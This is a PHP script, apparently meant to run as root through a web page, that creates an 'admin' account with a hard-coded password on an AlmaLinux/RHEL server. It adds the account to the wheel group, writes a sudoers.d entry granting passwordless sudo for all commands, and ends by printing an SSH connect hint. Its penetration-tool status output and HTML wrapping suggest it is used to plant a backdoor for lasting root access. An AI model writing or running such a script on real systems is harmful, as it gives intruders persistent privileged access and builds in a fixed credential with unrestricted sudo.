<?php

error_reporting(E_ALL);
ini_set('display_errors', '1');

if (PHP_OS_FAMILY === 'Windows') {
    die("[-] This script is designed for Linux-based systems.\n");
}

if (function_exists('posix_getuid') && posix_getuid() !== 0) {
    die("[-] This script must be run as root (UID 0).\n");
}

$username = 'admin';
$password = 'patlabIym1e3';

echo "<pre>";

$info = posix_getpwuid(posix_getuid());

echo "[*] Target OS: AlmaLinux 8.10 / RHEL family\n";
echo "[*] Script running as: " . ($info['name'] ?? 'unknown') . "\n\n";

if (!preg_match('/^[a-z_][a-z0-9_-]*$/i', $username)) {
    die("[-] Invalid username.\n");
}

function commandExists(string $command): bool
{
    $path = trim((string) shell_exec("command -v " . escapeshellarg($command) . " 2>/dev/null"));
    return $path !== '';
}

foreach (['useradd', 'id', 'usermod', 'chpasswd', 'visudo'] as $command) {
    if (!commandExists($command)) {
        die("[-] Required command not found: {$command}\n");
    }
}

$checkUser = sprintf(
    'id %s >/dev/null 2>&1',
    escapeshellarg($username)
);

exec($checkUser, $output, $returnVar);

if ($returnVar === 0) {
    echo "[!] User '{$username}' already exists. Skipping creation.\n";
} else {
    echo "[*] Creating user '{$username}'...\n";

    $cmdUser = sprintf(
        'useradd -m -s /bin/bash %s 2>&1',
        escapeshellarg($username)
    );

    exec($cmdUser, $userOutput, $ret);

    if ($ret !== 0) {
        echo implode("\n", $userOutput) . "\n";
        die("[-] Failed to create user.\n");
    }

    echo "[+] User created successfully.\n\n";
}

echo "[*] Setting password...\n";

$process = proc_open(
    '/usr/sbin/chpasswd',
    [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ],
    $pipes
);

if (!is_resource($process)) {
    die("[-] Failed to start chpasswd.\n");
}

fwrite($pipes[0], $username . ':' . $password . PHP_EOL);
fclose($pipes[0]);

$stdout = stream_get_contents($pipes[1]);
$stderr = stream_get_contents($pipes[2]);

fclose($pipes[1]);
fclose($pipes[2]);

$ret = proc_close($process);

if ($ret !== 0) {
    echo "[-] Failed to set password.\n";
    if ($stderr !== '') {
        echo $stderr . "\n";
    }
} else {
    echo "[+] Password set successfully.\n\n";
}

echo "[*] Adding user to 'wheel' group...\n";

$cmdGroup = sprintf(
    'usermod -aG wheel %s 2>&1',
    escapeshellarg($username)
);

exec($cmdGroup, $groupOutput, $ret);

if ($ret !== 0) {
    echo "[-] Failed to add user to wheel group.\n";
    echo implode("\n", $groupOutput) . "\n";
} else {
    echo "[+] User added to wheel group.\n\n";
}

$sudoersFile = "/etc/sudoers.d/{$username}";
$sudoersContent = "{$username} ALL=(ALL) NOPASSWD: ALL\n";

echo "[*] Configuring sudo privileges...\n";

if (file_put_contents($sudoersFile, $sudoersContent, LOCK_EX) === false) {
    echo "[-] Failed to write sudoers configuration.\n";
} else {
    chmod($sudoersFile, 0440);

    $checkSudoers = sprintf(
        'visudo -c -f %s 2>&1',
        escapeshellarg($sudoersFile)
    );

    exec($checkSudoers, $sudoOutput, $ret);

    if ($ret !== 0) {
        unlink($sudoersFile);

        echo "[-] Invalid sudoers configuration. File removed.\n";
        echo implode("\n", $sudoOutput) . "\n";
    } else {
        echo "[+] Sudo configuration validated successfully.\n\n";
    }
}

echo "[*] Verifying user configuration...\n";

$verify = sprintf(
    'id %s 2>&1',
    escapeshellarg($username)
);

system($verify, $ret);

if ($ret !== 0) {
    echo "[-] User verification failed.\n";
} else {
    echo "\n[+] User configuration verified.\n";
}

echo "\n[+] Process completed!\n";
echo "[+] Connect via: ssh {$username}@<server_ip>\n";

echo "</pre>";
